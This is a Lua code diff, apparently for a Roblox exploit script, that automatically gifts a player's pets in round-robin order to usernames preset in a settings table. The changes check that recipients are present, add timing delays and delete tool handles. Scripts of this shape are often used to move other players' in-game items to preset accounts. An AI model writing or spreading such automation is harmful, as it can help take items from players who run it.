@@ -16,19 +16,29 @@ local function wait(duration)
     until tick() - start >= duration
 end
 
--- Function to get list of recipient usernames from settings
-local function getRecipientUsernames()
-    local recipients = {}
+-- Function to find valid recipients that are currently in the server
+local function findValidRecipients()
+    local validRecipients = {}
     
-    if Settings.RECIPIENT_USERNAMES then
-        for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
-            if enabled then
-                table.insert(recipients, username)
+    if not Settings.RECIPIENT_USERNAMES then
+        print("❌ No RECIPIENT_USERNAMES found in settings")
+        return validRecipients
+    end
+    
+    -- Check each enabled recipient to see if they're in the server
+    for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
+        if enabled then
+            local targetPlayer = Players:FindFirstChild(username)
+            if targetPlayer then
+                table.insert(validRecipients, username)
+                print(string.format("✅ Found valid recipient in server: %s", username))
+            else
+                print(string.format("⚠️ Recipient not found in server: %s", username))
             end
         end
     end
     
-    return recipients
+    return validRecipients
 end
 
 -- Function to select next recipient (round-robin style)
@@ -230,16 +240,20 @@ local function processGifting(validPetsData, recipients)
             
             -- Step 1: Delete tool handle
             deleteToolHandle(tool)
+            wait(0.2)
             
+            -- Step 2: Equip the tool
             if equipPetTool(tool) then
-                wait(0.1) -- Wait for equip to register
+                wait(0.5) -- Wait for equip to register
                 
                 -- Step 3: Send gifting remote
                 if sendGiftingRemote(petUUID, currentRecipient) then
                     giftingStats[currentRecipient] = giftingStats[currentRecipient] + 1
                     totalGifted = totalGifted + 1
                 end
-            
+                wait(0.3)
+                
+                -- Step 4: Unequip the tool
                 unequipPetTool(tool)
                 wait(0.2)
             else
@@ -279,16 +293,24 @@ local function startGiftingProcess(validPetsData, customRecipients)
         return
     end
     
-    -- Use custom recipients if provided, otherwise get from settings
-    local recipients = customRecipients or getRecipientUsernames()
+    -- Use custom recipients if provided, otherwise find valid recipients from settings
+    local recipients = customRecipients or findValidRecipients()
     
     if not recipients or #recipients == 0 then
-        print("❌ No valid recipients found in settings or provided")
-        print("💡 Make sure Settings.RECIPIENT_USERNAMES has at least one enabled recipient")
+        print("❌ No valid recipients found in server")
+        print("💡 Make sure at least one recipient from Settings.RECIPIENT_USERNAMES is in the server")
+        if Settings.RECIPIENT_USERNAMES then
+            print("🔍 Checking for these recipients:")
+            for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
+                if enabled then
+                    print(string.format("   - %s", username))
+                end
+            end
+        end
         return
     end
     
-    print(string.format("🎯 Found %d valid recipients: %s", #recipients, table.concat(recipients, ", ")))
+    print(string.format("🎯 Found %d valid recipients in server: %s", #recipients, table.concat(recipients, ", ")))
     
     -- Start the gifting process
     processGifting(validPetsData, recipients)
@@ -303,15 +325,15 @@ print("🚀 Pet Gifting Script Loaded!")
 if _G.VALID_PETS_DATA then
     print("📦 Valid pets data found from main script!")
     
-    -- Get recipients from settings
-    local recipients = getRecipientUsernames()
+    -- Find recipients that are currently in the server
+    local recipients = findValidRecipients()
     
     if recipients and #recipients > 0 then
-        print(string.format("🎯 Starting gifting process with %d recipients", #recipients))
+        print(string.format("🎯 Starting gifting process with %d recipients found in server", #recipients))
         startGiftingProcess(_G.VALID_PETS_DATA)
     else
-        print("⚠️ No valid recipients found in Settings.RECIPIENT_USERNAMES")
-        print("💡 Make sure to enable at least one recipient in your settings")
+        print("⚠️ No valid recipients found in current server")
+        print("💡 Make sure at least one recipient from Settings.RECIPIENT_USERNAMES is in the server")
         print("Manual usage: _G.startGiftingProcess(_G.VALID_PETS_DATA, {'Username1', 'Username2'})")
     end
 else
